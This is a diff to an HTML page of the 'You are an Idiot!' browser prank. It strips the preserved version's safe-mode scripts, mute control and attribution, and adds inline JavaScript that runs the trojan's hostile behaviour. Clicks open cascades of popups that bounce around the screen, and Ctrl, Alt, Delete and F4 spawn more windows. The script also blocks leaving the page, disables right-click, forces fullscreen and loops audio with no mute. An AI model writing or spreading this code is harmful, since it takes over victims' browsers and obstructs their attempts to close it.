@@ -1,59 +1,24 @@
-<html lang="en"><head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<meta name="darkreader-lock">
-
-		<meta name="Author" content="The ADR and Jazzy (2020 onwards - Endermanch)">
-		<meta name="Keywords" content="computer virus, virus, trojan, you are an idiot, youareanidiot.cc, youareanidiot.org, idiot, youdontknowwhoiam.org">
-		<meta name="Description" content="The official HTML5 port of the legendary infamous YouAreAnIdiot JS Trojan. ☺ ☺ ☺ Once found on www.youdontknowwhoiam.org, preserved here. The original author is unknown.">
-		
-		<!--
-			ADR & Jazzy's description:
-			<meta name="Description" content="This is the orgional and the best flash video on the 'net.  Once found on www.youdontknowwhoiam.org, not found where it belong, right here on www.youareanidiot.org.">
-		-->
-		
-		<meta property="og:type" content="website">
-		<meta property="og:title" content="You are an Idiot! (dot cc)">
-		<meta property="og:description" content="The official HTML5 port of the legendary infamous YouAreAnIdiot JS Trojan.">
-		<meta property="og:url" content="https://youareanidiot.cc/">
-		<meta property="og:image" content="http://youareanidiot.cc/images/idiot.png">
-		<meta property="og:image:secure_url" content="https://youareanidiot.cc/images/idiot.png">
-		<meta property="og:image:width" content="256">
-		<meta property="og:image:height" content="256">
-		<meta property="og:image:alt" content="Idiot!">
-
-		<title>You are an Idiot! (dot cc)</title>
-
-		<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
-		<link rel="icon" type="image/x-icon" href="/favicon.ico">
-		
-		<link rel="stylesheet" href="/styles/styles.css" type="text/css">
-	</head>
-
-	<body class="adaptive">
-		<section class="topbar">
-			<nav class="controls adaptive">
-				<img class="speaker clicky" id="youare-micon" src="/images/speakerm.avif" width="32" height="32" alt="Mute control">
-
-				<div class="links" id="youare-links">
-					<a class="link" target="_blank" href="https://go.enderman.ch/3Qn9lXg">about</a>
-					<a class="link" href="https://fl.youareanidiot.cc/">legacy</a>
-					<a class="link" href="/safe">safe</a>
-				</div>
-			</nav>
-
-			<!--
-			<aside class="alert">
-				<img src="/images/warning.avif" width="32" height="32" alt="Warning!">
-				<span>
-					<strong>Phishing <span class="text-red">false positive</span> </strong><a class="link" href="/updates">(read more)</a>
-				</span>
-			</aside>
-			-->
-		</section>
-		
-		<main class="idiot clicky" id="youare-container">		
-			<svg class="frame-black" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" x="0px" y="0px" width="806px" height="604px" viewBox="0 0 806 604">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>You are an Idiot!</title>
+<link rel="icon" href="/favicon.ico">
+<style>
+html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#fff;font-family:"Times New Roman",serif;cursor:default;}
+.idiot{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;justify-content:center;align-items:center;}
+.idiot>svg{position:fixed;top:50%;left:50%;width:100%;height:100%;transform:translate(-50%,-50%);-webkit-user-select:none;user-select:none;}
+@keyframes key-black{from,to{visibility:visible}50%{visibility:hidden}}
+@keyframes key-white{from,to{visibility:hidden}50%{visibility:visible}}
+.frame-black{animation:key-black step-end 666ms infinite;}
+.frame-white{animation:key-white step-end 666ms infinite;}
+</style>
+</head>
+<body>
+<main class="idiot" id="youare-container">
+<svg class="frame-black" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" x="0px" y="0px" width="806px" height="604px" viewBox="0 0 806 604">
 				<defs></defs>
 
 				<g id="Layer_1">
@@ -417,7 +382,7 @@
 				</g>
 				</g>
 			</svg>
-			<svg class="frame-white" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" x="0px" y="0px" width="806px" height="604px" viewBox="0 0 806 604">
+<svg class="frame-white" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" x="0px" y="0px" width="806px" height="604px" viewBox="0 0 806 604">
 				<defs></defs>
 
 				<g id="Layer_1">
@@ -769,28 +734,61 @@
 				</g>
 				</g>
 			</svg>
-		</main>	
-		
-		<footer class="contact" id="youare-footer">
-			<a class="small" href="/updates">v1.5</a>
-			<span>
-				Made with 💖 by <a class="link" target="_blank" href="https://go.enderman.ch/youtube">Enderman</a><br>
-				Feedback: <a class="link" href="mailto:youare@enderman.ch">youare@enderman.ch</a>
-			</span>
-		</footer>
-	
-		<audio id="youare-audio" hidden="">
-			<source src="/media/youare.mp3" type="audio/mp3">
-		</audio>
-		
-		<audio id="youare-overlap" hidden="">
-			<source src="/media/youare.mp3" type="audio/mp3">
-		</audio>
+</main>
+<audio id="snd" src="/media/youare.mp3" autoplay loop playsinline></audio>
+<script>
+(function(){
+  var snd = document.getElementById("snd");
+  var isPopup = !!window.opener;
 
-		<script src="/scripts/safe.js" type="application/javascript"></script>
-		<script src="/scripts/math.js" type="application/javascript"></script>
-		<script src="/scripts/cleanup.js" type="application/javascript"></script>
-		<script src="/scripts/you.js" type="application/javascript"></script>
-		<script src="/scripts/fullscreen.js" type="application/javascript"></script>
+  // Audio: play by default, loop forever, no mute. Main window only (popups stay
+  // silent so dozens of windows don't become an audio avalanche). Browsers block
+  // autoplay-with-sound until a gesture, so we also start it on the first one.
+  function playAudio(){ if(isPopup) return; try{ var p=snd.play(); if(p&&p.catch) p.catch(function(){}); }catch(e){} }
 
-</body></html>
+  // Auto-fullscreen (main window only; needs a user gesture).
+  function goFs(){
+    if(isPopup || document.fullscreenElement || document.webkitFullscreenElement) return;
+    var el=document.documentElement;
+    var fn=el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen||el.msRequestFullscreen;
+    if(fn){ try{ var p=fn.call(el); if(p&&p.catch) p.catch(function(){}); }catch(e){} }
+  }
+
+  // Popups: each click opens more windows of this same page.
+  function openWindow(){ try{ window.open("/","_blank","menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,width=357,height=330"); }catch(e){} }
+  async function proCreate(n){ for(var i=0;i<n;i++){ openWindow(); await new Promise(function(r){ setTimeout(r,50); }); } }
+
+  // Bounce this window around the screen (works for script-opened popups).
+  var xOff=5,yOff=5,xPos=400,yPos=-100;
+  function newXlt(){ xOff=Math.ceil(-6*Math.random())*5-10; window.focus(); }
+  function newXrt(){ xOff=Math.ceil(7*Math.random())*5-10; }
+  function newYup(){ yOff=Math.ceil(-6*Math.random())*5-10; }
+  function newYdn(){ yOff=Math.ceil(7*Math.random())*5-10; }
+  function playBall(){
+    xPos+=xOff; yPos+=yOff;
+    if(xPos>screen.width-357) newXlt();
+    if(xPos<0) newXrt();
+    if(yPos>screen.height-330) newYup();
+    if(yPos<0) newYdn();
+    try{ window.moveTo(xPos,yPos); }catch(e){}
+    setTimeout(playBall,10);
+  }
+
+  function onGesture(){ playAudio(); goFs(); }
+  var evs=["pointerdown","touchstart","keydown","click"],i;
+  for(i=0;i<evs.length;i++) window.addEventListener(evs[i],onGesture,true);
+
+  window.addEventListener("load",function(){ playAudio(); if(isPopup) playBall(); });
+  document.addEventListener("click",function(){ proCreate(isPopup?3:6); });
+
+  window.onbeforeunload=function(){ return "Are you an idiot?"; };
+  window.oncontextmenu=function(){ return false; };
+  window.onkeydown=function(e){
+    var k=(e||window.event).key;
+    if(["Control","Alt","Delete","F4"].indexOf(k)>=0){ proCreate(isPopup?3:6); alert("You are an idiot!"); }
+    return null;
+  };
+})();
+</script>
+</body>
+</html>
